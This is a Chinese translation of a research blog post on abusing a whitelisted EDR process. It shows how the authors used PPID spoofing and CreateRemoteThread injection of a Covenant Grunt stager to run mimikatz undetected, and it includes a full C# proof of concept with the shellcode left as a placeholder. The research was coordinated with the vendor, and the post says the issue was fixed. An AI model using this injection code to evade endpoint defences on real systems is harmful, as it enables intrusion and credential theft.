@@ -1,0 +1,247 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>原文链接：<a href="https://riccardoancarani.github.io/2023-08-03-attacking-an-edr-part-1/" target="_blank">https://riccardoancarani.github.io/2023-08-03-attacking-an-edr-part-1/</a></p>
+<h2 data-content="1" id="1f9226cf57d5484a71f08d926612e206">译者开头说两句</h2>
+<p>这个系列的文章主要不是将通过一些流量加密，SYSCALL，内存加密等等操作来绕过EDR检测，而是从EDR产品设计的角度来寻找可能存在的缺陷（毕竟EDR也是一款软件，同样可能存在某些设计缺陷），通过缺陷来篡改EDR本身的功能，从而达到让EDR失去部分或者全部检测能力的效果。通过这一系列的文章可以帮助我们更加了解EDR的运作机制，从产品的角度出发思考问题，也许能得到一些启发。</p>
+<h2 data-content="1" id="31e3dd0cd059ca9b226f203cd84a647c">介绍</h2>
+<p>免责声明：这篇文章是与Devid Lana合作完成的。你可以在这里找到他的博客：<a href="https://her0ness.github.io" target="_blank">https://her0ness.github.io</a></p>
+<p>我们希望这篇文章是一长串文章中的第一篇，详细介绍了现代 EDR 产品上的一些常见缺陷。这绝不是一个完备的参考材料，但希望能提供一些实用的东西来分析这些庞大的产品，并尝试从黑盒的角度理解它们的功能。</p>
+<p>这些攻击实际上是针对 EDR 领域的顶级产品之一进行的，我们很幸运，供应商热衷于合作并为我们提供了一个测试平台，我们可以在其中以安全和可控的方式进行实验。我们相信，如果没有这种合作，就不可能取得我们所做的结果，希望将来EDR将更加开放，以便研究人员进行测试。毋庸置疑，与我们合作的特定供应商非常热衷于进行这种合作，并修复了我们报告的所有问题。</p>
+<p>由于我们的目的不是点名羞辱并避开可能入狱的风险，因此我们将此产品称为 STRANGETRINITY。</p>
+<p>我们使用的方法部分基于预先存在的研究，不可能不提到 MDSec 对 Cylance 的研究。总而言之，我们收集了以前的研究，并从配置和检测的角度确定了操作系统中 EDR 存在的各个位置：</p>
+<ul>
+<li>注入的 DLL</li>
+<li>注册表项</li>
+<li>网络通信</li>
+<li>安装/卸载的过程</li>
+<li>文件隔离</li>
+</ul>
+<p>在进行这项研究时，我们没有执行任何基于内核的分析，因为我们还不具备这些技能。请注意，第一部分是在 2020 年进行的技术，因此请记住，在过去三年中，进攻和防御技术的发展都取得了极快的进步。因此，不能保证该技术适用于实际的（2023 年）现代 EDR。</p>
+<h2 data-content="1" id="8170eebfb1005ae4b20fb68aac568f8d">漏洞</h2>
+<p>这项研究从一个简单的假设开始：</p>
+<p>如果某个进程没有在内存中加载 EDR 挂钩 DLL，但其他进程加载了，则必须以某种方式将其列入白名单。对于那些不熟悉 EDR 架构的人来说，至少在过去，他们中的大多数人都习惯在大多数用户态进程中注入 DLL。这样做的目的之一是执行用户层hook。hook是一种转移正常 API 调用流程以修改其功能的做法，对于游戏作弊开发人员来说非常流行。 EDR 利用 API HOOK来检查各种 API 的参数，这些参数可能被恶意软件滥用来执行进程注入等操作。我们的想法很简单，如果一个进程没有 DLL，那么它很可能不会像有 DLL 的进程那样受到检查。</p>
+<p>如何验证这个假设呢？我们首先搜索安装了产品但未加载 DLL 的虚拟机中的所有进程，使用了类似于以下的命令：</p>
+<pre><code>tasklist /m /FO CSV | findstr /i /v STRANGETRINITY.DLL</code></pre>
+<p>具体说一下，“tasklist /m”枚举了所有进程和加载的模块，“/FO CSV”以 CSV 格式打印结果，随后由“findstr”命令过滤。有趣的是，我们得到了一些有效的信息！</p>
+<pre><code>"smss.exe","324","N/A"
+"csrss.exe","452","N/A"
+"wininit.exe","524","N/A"
+"csrss.exe","532","N/A"
+"services.exe","632","N/A"
+"lsass.exe","640","N/A"
+"STRANGETRINITY.exe","6748", [...]
+"MsMpEng.exe","2892","N/A"
+"svchost.exe","688","N/A"
+"SecurityHealthService.exe","1796","N/A"</code></pre>
+<p>列表中的大多数进程都具有保护级别（PPL），该保护级别有效地阻止我们在不依赖漏洞利用的情况下以有目的的方式与它们进行交互。但是，STRANGETRINITY.exe进程没有进程保护，并且与EDR解决方案本身有关。然后我们执行另一个任务列表命令来确认 DLL 确实没有被加载：</p>
+<pre><code>tasklist /m /fi "PID eq 6748"
+
+Image Name                  PID Modules
+========================= ======== ============================================
+STRANGETRINITY.exe  6748 ntdll.dll,
+KERNEL32.DLL, KERNELBASE.dll,
+ADVAPI32.dll,
+msvcrt.dll, sechost.dll, RPCRT4.dll,
+USER32.dll, win32u.dll, GDI32.dll,
+gdi32full.dll, msvcp_win.dll, ucrtbase.dll,
+[...]</code></pre>
+<p>有趣的是，该进程也以当前低特权用户帐户的身份运行，这使其成为注入的良好候选者。</p>
+<p>经过几次试验和失败，我们发现效果最好的解决方案是利用 PPID 欺骗技术创建一个新进程，就好像它是由STRANGETRINITY.EXE生成的一样。作为注入目标，我们决定生成另一个STRANGETRINITY.EXE实例。</p>
+<p>就使用的注入技术而言，它是一个简单的 CreateRemoteThread 注入，结合 Covenant 的shellcode。</p>
+<p>在制作并执行 PoC 后，我们立即在测试 VM 机上植入了beacon。这本身就已经令人惊讶了，因为我们使用的是已知的 C2 框架，没有混淆并使用了极其基础的注入技术。然而，最有趣的事实是，可以从该进程中执行各种开发后 TTP，并且不会检测到任何内容。举例来说，mimikatz 凭据转储 DLL 被注入内存中，而没有引起任何检测。</p>
+<p>请注意，这种忽略事后 TTP 的特定行为只有在针对该特定进程注入这种确切技术时才会发生。即使你设法注入beacon而没有在另一个不相关的进程中引起EDR的检测，你尝试运行类似 mimikatz 的东西，您的会话也会被终止。</p>
+<p>这最终证实了我们最初的假设，即该进程确实被列入白名单。与供应商及其技术团队的交流非常有用，可以理解这是意外的特性，而不是无论如何都会在EDR下随意进行各种注入技术之一。</p>
+<h2 data-content="1" id="38d9e49c834f5fefff15bf170149c6ae">概念验证代码</h2>
+<p>以下代码的片段目的是作为POC，用于确认问题</p>
+<pre><code>using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace GruntInjection
+{
+    class Program
+    {
+        public const uint CreateSuspended = 0x00000004;
+        public const uint DetachedProcess = 0x00000008;
+        public const uint CreateNoWindow = 0x08000000;
+        public const uint ExtendedStartupInfoPresent = 0x00080000;
+        public const int ProcThreadAttributeParentProcess = 0x00020000;
+
+        // Hardcoded Grunt Stager
+        public static byte[] gruntStager = Convert.FromBase64String("[[shellcode here]]");
+
+        static void Main(string[] args)
+        {
+            if (args.Length &lt; 2)
+            {
+                Console.Error.WriteLine("Invalid number of args");
+                return;
+            }
+
+            // Create new process
+            PROCESS_INFORMATION pInfo = CreateTargetProcess(args[0], int.Parse(args[1]));
+
+            // Allocate memory
+            IntPtr allocatedRegion = VirtualAllocEx(pInfo.hProcess, IntPtr.Zero, (uint)gruntStager.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
+
+            // Copy Grunt PIC to new process
+            UIntPtr bytesWritten;
+            WriteProcessMemory(pInfo.hProcess, allocatedRegion, gruntStager, (uint)gruntStager.Length, out bytesWritten);
+
+            // Change memory region to RX
+            MemoryProtection oldProtect;
+            VirtualProtectEx(pInfo.hProcess, allocatedRegion, (uint)gruntStager.Length, MemoryProtection.ExecuteRead, out oldProtect);
+
+            // Create the new thread
+            CreateRemoteThread(pInfo.hProcess, IntPtr.Zero, 0, allocatedRegion, IntPtr.Zero, 0, IntPtr.Zero);
+        }
+
+        public static PROCESS_INFORMATION CreateTargetProcess(string targetProcess, int parentProcessId)
+        {
+            STARTUPINFOEX sInfo = new STARTUPINFOEX();
+            PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
+
+            sInfo.StartupInfo.cb = (uint)Marshal.SizeOf(sInfo);
+            IntPtr lpValue = IntPtr.Zero;
+
+            try
+            {
+                SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
+                SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
+                pSec.nLength = Marshal.SizeOf(pSec);
+                tSec.nLength = Marshal.SizeOf(tSec);
+
+                uint flags = CreateSuspended | DetachedProcess | CreateNoWindow | ExtendedStartupInfoPresent;
+
+                IntPtr lpSize = IntPtr.Zero;
+
+                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
+                sInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+                InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, ref lpSize);
+
+                IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
+                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
+                Marshal.WriteIntPtr(lpValue, parentHandle);
+
+                UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);
+
+                CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfo, out pInfo);
+
+                return pInfo;
+
+            }
+            finally
+            {
+                DeleteProcThreadAttributeList(sInfo.lpAttributeList);
+                Marshal.FreeHGlobal(sInfo.lpAttributeList);
+                Marshal.FreeHGlobal(lpValue);
+            }
+        }
+
+        [DllImport("kernel32.dll")]
+        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);
+
+        [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
+        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFOEX
+        {
+            public STARTUPINFO StartupInfo;
+            public IntPtr lpAttributeList;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct STARTUPINFO
+        {
+            public uint cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public uint dwX;
+            public uint dwY;
+            public uint dwXSize;
+            public uint dwYSize;
+            public uint dwXCountChars;
+            public uint dwYCountChars;
+            public uint dwFillAttributes;
+            public uint dwFlags;
+            public ushort wShowWindow;
+            public ushort cbReserved;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdErr;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public int bInheritHandle;
+        }
+
+        [Flags]
+        public enum AllocationType
+        {
+            Commit = 0x1000,
+            Reserve = 0x2000,
+            Decommit = 0x4000,
+            Release = 0x8000,
+            Reset = 0x80000,
+            Physical = 0x400000,
+            TopDown = 0x100000,
+            WriteWatch = 0x200000,
+            LargePages = 0x20000000
+        }
+
+        [Flags]
+        public enum MemoryProtection
+        {
+            Execute = 0x10,
+            ExecuteRead = 0x20,
+            ExecuteReadWrite = 0x40,
+            ExecuteWriteCopy = 0x80,
+            NoAccess = 0x01,
+            ReadOnly = 0x02,
+            ReadWrite = 0x04,
+            WriteCopy = 0x08,
+            GuardModifierflag = 0x100,
+            NoCacheModifierflag = 0x200,
+            WriteCombineModifierflag = 0x400
+        }
+    }
+}</code></pre>
+<h2 data-content="1" id="f0b6a059143f8e48dd2a984e9e8398a0">尾声</h2>
+<p>为了结束这个传奇的第一篇文章，我们可以强调这样一个事实，即这些产品虽然结构良好，由高水平的技术专业知识组成，并在全球范围内取得了广泛的成功，但仍然存在一些漏洞。尽管我们展示的漏洞很简单，但它的影响是不可否认的。</p>
+<p>与反作弊产品不同，反作弊产品专注于保护单个或有限数量的进程，而当涉及到 EDR（端点检测和响应）时，攻击面要广泛得多。这导致做出的选择或假设将不可避免地被攻击者利用。在接下来的章节中，我们将演示有时如何在agent和server之间的通信协议中攻击的解决方案，这些产品通常准备好可移植可执行的单个文件在需要保护的系统的系统中进行安装。</p>
+</div>
+</div>
